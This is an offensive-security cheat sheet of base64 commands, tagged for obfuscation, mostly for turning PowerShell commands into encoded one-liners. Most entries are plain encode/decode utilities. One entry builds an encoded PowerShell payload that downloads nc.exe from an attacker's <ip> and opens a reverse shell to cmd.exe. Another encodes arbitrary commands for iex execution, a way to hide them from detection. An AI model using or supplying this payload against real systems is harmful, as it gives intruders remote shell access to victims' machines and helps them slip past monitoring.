# base64

% obfuscation, base64

#plateform/linux #target/local #cat/UTILS 

## iconv - base64 encode file (for powershell) 
```bash
iconv -f ASCII -t UTF-16LE <file> | base64 -w 0
```

## iconv - base64 encode command (for powershell)
```bash
echo "<pwsh_cmd|iex(command)>" | iconv --to-code UTF-16LE | base64 -w 0
```

## python - base64 encode command (for powershell)
```bash
python -c 'import base64; print(base64.b64encode((r"""<powershell_command>""").encode("utf-16-le")).decode())'
```

## python - base64 encode nc revshell (for powershell)
```bash
python -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://<ip>/nc.exe", "c:\windows\temp\nc.exe"); c:\windows\temp\nc.exe -nv <ip> <port> -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```

## base64 - encode string 
```bash
echo '<string>' | base64 -w 0
```

## base64 - decode string 
```bash
echo '<string>' | base64 -d 
```


## base64 - encode file 
```bash
cat <path> | base64 -w 0
```

## base64 - decode file 
```bash
cat <path> | base64 -d 
```